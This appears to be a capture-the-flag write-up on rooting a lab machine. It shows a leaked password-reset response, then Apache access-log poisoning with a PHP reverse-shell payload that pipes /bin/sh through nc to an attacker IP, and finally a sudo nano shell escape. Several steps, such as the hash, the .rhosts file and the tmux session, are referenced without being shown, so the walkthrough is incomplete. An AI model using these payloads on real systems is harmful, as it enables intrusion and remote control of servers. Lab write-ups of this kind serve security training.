The scan found some interesting ports. Ports 512, 513, and 514 are the classic "r-services" trio: `rexec`, `rlogin`, and `rsh`. These are old remote-access services that predate SSH and can trust a client based on hostname/IP and username instead of a password. That detail becomes important later.

### Web Enumeration

My first step was to check the web server.

![Admin Login](/assets/img/posts/reset/login.png)

![reset password](/assets/img/posts/reset/reset.png)

I found an admin login page. I tried some default credentials and a few SQL injection payloads, but nothing worked. So I checked the "forgot password" feature. I fired up Burp Suite, sent a reset request for the `admin` username, and sent it to Repeater to inspect the response.

![burpsuite](/assets/img/posts/reset/burp.png)

The response leaked the new admin password:

```json
{
    "username":"admin",
    "new_password":"cb0164c0",
    "timestamp":"2026-09-02 19:20:03"
}
```

I logged in with the new password and got access to the admin panel.

![admin panel](/assets/img/posts/reset/admin_dashboard.png)

The panel has a feature to view log files by selecting one from a list. With FoxyProxy already pointing to Burp, I clicked "view log" and inspected the request in Burp.

![burp 2](/assets/img/posts/reset/burp2.png)

I tried several path traversal payloads, like `/etc/passwd`, but got nothing back. However, requesting `/var/log/apache2/access.log` returned actual log content.

![access log](/assets/img/posts/reset/burp3.png)

Since the access log includes the `User-Agent` header for every request, this looked like a good candidate for log poisoning.

## Exploitation

I sent a PHP payload as the `User-Agent`:

```text
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.47 4444 >/tmp/f'); ?>
```

```bash
┌─[tr3m0x@parrot]─[~/htb/linux/Reset]
└──╼ curl -X POST http://10.129.234.130 -H "User-Agent: <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.47 9001 >/tmp/f'); ?>"
```

Then I requested the access log through the admin panel again, which executed the poisoned entry and gave me a reverse shell.

```bash
┌─[tr3m0x@parrot]─[~/htb/linux/Reset]
└──╼ $curl -X POST "http://10.129.234.130/dashboard.php" -H "Cookie: PHPSESSID=mr06epdsc5uh2uo0c88i3b7tld" -d "file=/var/log/apache2/access.log"
```

And I got a shell:

```bash
┌─[✗]─[tr3m0x@parrot]─[~/htb/linux/Reset]
└──╼ $nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.129.234.130 56810
/bin/sh: 0: can't access tty; job control turned off
$ 
```

This hash isn't useful on its own, since it's just the SHA1 of the same password I already used to log in. I confirmed this by reading `reset_password.php`:

```php
<?php
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $db = new SQLite3('private_34eee5d2/db.sqlite');
    $stmt = $db->prepare('SELECT * FROM users WHERE username = :username');
    $stmt->bindValue(':username', $username, SQLITE3_TEXT);
    $result = $stmt->execute();
    $user = $result->fetchArray(SQLITE3_ASSOC);

    if ($user) {
        $newPassword = bin2hex(random_bytes(4)); // Generate 8-character password
        $hashedPassword = sha1($newPassword);
        $updateStmt = $db->prepare('UPDATE users SET password_hash = :password_hash WHERE username = :username');
        $updateStmt->bindValue(':password_hash', $hashedPassword, SQLITE3_TEXT);
        $updateStmt->bindValue(':username', $username, SQLITE3_TEXT);
        $updateStmt->execute();

        echo json_encode([
            'username' => $username,
            'new_password' => $newPassword,
            'timestamp' => date('Y-m-d H:i:s')
        ]);
    } else {
        echo json_encode(['error' => 'User not found']);
    }
} else {
    echo json_encode(['error' => 'Invalid request']);
}
?>
```

There's the user flag, along with a **.rhosts** file. That, combined with the open `rexec`/`rlogin`/`rsh` ports found in the initial scan, was the giveaway: `.rhosts` is the trust file used by the r-services to allow passwordless logins from specified hosts and users. I couldn't read the file's contents yet as www-data, but decided to test whether **sadm** was configured as a trusted user.

## Privilege Escalation

I checked sudo permissions for the sadm user.

```bash
sadm@reset:~$ sudo -l 
[sudo] password for sadm: 
sudo: a password is required
```

No password on hand yet, so I went back to the tmux session I'd found earlier and attached to it.

```bash
sadm@reset:~$ tmux attach -t sadm_session
echo 7lE2PAfVHfjz4HpE | sudo -S nano /etc/firewall.sh
sadm@reset:~$ echo 7lE2PAfVHfjz4HpE | sudo -S nano /etc/firewall.sh
Too many errors from stdin
sadm@reset:~$
```

The session leaked the sadm user's password in its scrollback. With that password in hand, I checked sudo permissions again.

```bash
sadm@reset:~$ sudo -l 
Matching Defaults entries for sadm on reset:
    env_reset, timestamp_timeout=-1, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, !syslog

User sadm may run the following commands on reset:
    (ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
    (ALL) PASSWD: /usr/bin/tail /var/log/syslog
    (ALL) PASSWD: /usr/bin/tail /var/log/auth.log
```

The `PASSWD:` tag just means sudo will still prompt for a password for these commands — but since I now had it, that's not a blocker. Being able to run **nano** as root through sudo is enough to get a root shell, using the well-known GTFOBins technique for nano:

```text
sudo /usr/bin/nano /etc/firewall.sh
then CTRL + R 
then CTRL + X 
then reset; sh 1>&0 2>&0
```

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

And that's root.
